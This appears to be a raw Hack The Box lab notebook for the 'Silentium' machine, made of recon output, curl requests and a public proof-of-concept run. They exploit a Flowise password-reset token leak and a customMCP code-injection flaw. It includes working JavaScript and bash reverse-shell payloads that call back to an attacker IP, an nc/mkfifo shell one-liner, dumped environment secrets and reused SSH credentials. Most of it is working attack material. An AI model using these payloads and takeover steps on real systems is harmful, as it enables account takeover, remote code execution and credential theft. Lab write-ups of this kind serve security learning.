ffuf -u http://silentium.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.silentium.htb" -fs 154 -fc 301,302

 :: Filter           : Response size: 154
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 183ms]

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://silentium.htb/FUZZ -fc 404

/assets is forbidden

nmap

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:

mostly we need to exfilterate credentials for ssh?

──(ajp㉿kali)-[~/codeplay]
└─$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.exec(\"bash -c '\''bash -i >& /dev/tcp/10.10.15.149/9001 0>&1'\''\");return 1;})()})"
    }
  }'
{"message":"Invalid or Missing token"}  

nc -lvp 9001


http://staging.silentium.htb/

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://staging.silentium.htb/FUZZ -fc 404 -ac

{"user":{"email":"s@fl.com","tempToken":"qwer1234","password":"Password@123"}}


curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'

  ┌──(ajp㉿kali)-[~/codeplay/gitclone/watchTowr-vs-FreePBX-CVE-2025-57819]
└─$ curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user": {"email": "ben@silentium.htb"}}'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"9XVaPXEyhnCLvMTb8meXAHHs1Ae5rlCNc154KIkn37Ht9PDeDgn43Dw3dSln4i56","tokenExpiry":"2026-09-16T07:08:43.525Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-16T06:53:43.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}    

curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "tempToken": "<FRESH_LEAKED_TOKEN>",
    "password": "Password123!",
    "confirmPassword": "Password123!"
  }'

┌──(ajp㉿kali)-[~/codeplay/htb/machines/silentium]
└─$ python3 password_reset.py -u http://staging.silentium.htb -e ben@silentium.htb -p Password@123
[*] Triggering token leak for: ben@silentium.htb
[-] Failed to trigger reset. Status: 201
[-] Response: {"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"oTxOMgxsVkg23wGrqDTumGCizT6QEbRFXxc9czzHxJ0c8UBUoNNbJxvR12YEC1f6","tokenExpiry":"2026-09-16T07:33:09.649Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-16T07:18:09.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}


{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"IbirKPXSTsJSwLGJTduXHuUm7JBj7oRaDj9HcAcEQQ4f56ViUF1qKb4WxmRFJb1O","tokenExpiry":"2026-09-16T07:46:09.858Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-16T07:31:09.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}  


curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "tempToken": "SZnci783HStnCfmiWHU0y4XGK07QeaA2LrDeWP15blkcyBMCsCVly5bosSyohCqX",
    "password": "Password@123",
    "confirmPassword": "Password@123"
  }'


curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{
    "tempToken": "C3L09ikVBXcTyDAEW2VT9AdEXIxFAjl60cplA7l8DPjSaOfqZ53NDTiVcHRtCJsC",
    "password": "Password@123",
    "confirmPassword": "Password@123"
  }'


curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user": {"email": "ben@silentium.htb"}}'


curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
     -H "Content-Type: application/json" \
     -d '{
       "tempToken": "xPhXuWh3gvzYsmD0fbP9ZcAhiZyMc8ladXXSHcHyGAwkxo0Kyts0VAKFd95TYv66",
       "password": "Password@1234",
       "confirmPassword": "Password@1234"
     }'


lets try the burps uite way

https://github.com/kartik2005221/CVE-2025-58434-AND-59528-POC worked

└─$ python3 main.py -u http://staging.silentium.htb --lhost 10.10.15.149 --lport 9001 --email ben@silentium.htb


  ███████╗██╗      ██████╗ ██╗    ██╗██╗███████╗███████╗                                                                
  ██╔════╝██║     ██╔═══██╗██║    ██║██║██╔════╝██╔════╝                                                                
  █████╗  ██║     ██║   ██║██║ █╗ ██║██║███████╗█████╗                                                                  
  ██╔══╝  ██║     ██║   ██║██║███╗██║██║╚════██║██╔══╝                                                                  
  ██║     ███████╗╚██████╔╝╚███╔███╔╝██║███████║███████╗                                                                
  ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝╚══════╝╚══════╝                                                                

  ════════════════════════════════════════════════════════════════════
  CVE-2025-58434 │ Account Takeover via Token Disclosure │ CVSS 9.8 Critical
  CVE-2025-59528 │ Authenticated RCE via CustomMCP Node  │ CVSS Critical    
  ════════════════════════════════════════════════════════════════════
    ⚠  FOR EDUCATIONAL / AUTHORIZED SECURITY TESTING ONLY  ⚠
  ════════════════════════════════════════════════════════════════════

  ════════════════════════════════════════════════════════════════════
    FULL CHAIN MODE  │  CVE-2025-58434 → CVE-2025-59528
  ════════════════════════════════════════════════════════════════════

  [Step 1] [CVE-2025-58434] Requesting forgot-password token ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/account/forgot-password
  [*] Email    : ben@silentium.htb
  [*] HTTP 201

  ────────────────────────────────────────────────────────────────────
    LEAKED ACCOUNT DATA
  ────────────────────────────────────────────────────────────────────
  User ID       : e26c9d6c-678c-4c10-9e36-01813e8fea73
  Name          : admin
  Email         : ben@silentium.htb
  Credential    : $2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG
  Status        : active
  tempToken     : cgGGQcw8mvgdCGweBjksTyRgf1glFwCHRX2kdT1czf2qjKWA0TGh7S5FQIZzMIzk
  tokenExpiry   : 2026-09-20T07:48:25.181Z
  ────────────────────────────────────────────────────────────────────
  [+] tempToken  : cgGGQcw8mvgdCGweBjksTyRgf1glFwCHRX2kdT1czf2qjKWA0TGh7S5FQIZzMIzk
  [+] Expiry     : 2026-09-20T07:48:25.181Z
  [!] VULNERABLE — token disclosed without authentication!

  [Step 2] [CVE-2025-58434] Resetting password → Flowise@Pwn3d2025!
  [*] Endpoint     : http://staging.silentium.htb/api/v1/account/reset-password
  [*] New password : Flowise@Pwn3d2025!
  [*] HTTP 201
  [+] Password reset SUCCESSFUL (tempToken cleared)
  [+] Account takeover complete  →  ben@silentium.htb / Flowise@Pwn3d2025!

  [Step 3] [Auth] Logging in to extract session cookies ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/auth/login
  [*] Email    : ben@silentium.htb
  [*] HTTP 200

  ────────────────────────────────────────────────────────────────────
    EXTRACTED SESSION COOKIES
  ────────────────────────────────────────────────────────────────────
  token          : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
  refreshToken   : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImUyNmM5ZDZjLTY3OGMtNGMxMC0...
  connect_sid    : s%3Af4N7z7c1pKrFj9EDbPpNUQDsflIXlbw6.UHjfdT9gh5M%2BioutyB2vFk6gLoIHPy1Ri...
  ────────────────────────────────────────────────────────────────────
  [+] Session cookies obtained ✓

  [Step 4] [CVE-2025-59528] Executing RCE via CustomMCP ...
  [*] Endpoint : http://staging.silentium.htb/api/v1/node-load-method/customMCP
  [*] Command  : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.149 9001 >/tmp/f
  [*] Payload  : ({x:(function(){const cp=process.mainModule.require("child_process");const b64="cm0gL3Rt...

  ────────────────────────────────────────────────────────────────────
    RCE RESULT
  ────────────────────────────────────────────────────────────────────
  Mode    : Reverse Shell
  Command : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.149 9001 >/tmp/f
  LHOST   : 10.10.15.149
  LPORT   : 9001

  [+] Reverse shell payload fired!
  [!] Waiting for connection on 10.10.15.149:9001 ...
  [!] Make sure your listener is running:  nc -lvnp 9001
  ────────────────────────────────────────────────────────────────────

  ════════════════════════════════════════════════════════════════════
    CHAIN COMPLETE
  ════════════════════════════════════════════════════════════════════
  CVE-2025-58434  ✓  ATO   → ben@silentium.htb / Flowise@Pwn3d2025!
  CVE-2025-59528  ✓  RCE   → shell connecting to 10.10.15.149:9001
  ════════════════════════════════════════════════════════════════════




FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test



F1l3_d0ck3r
r04D!!_R4ge - ssh

ben@silentium:~$ cat user.txt
32464a3447ad384effc23e1a51ccc69d
ben@silentium:~$ 

exploited to root through pack2 vuln
 poc by vozec

 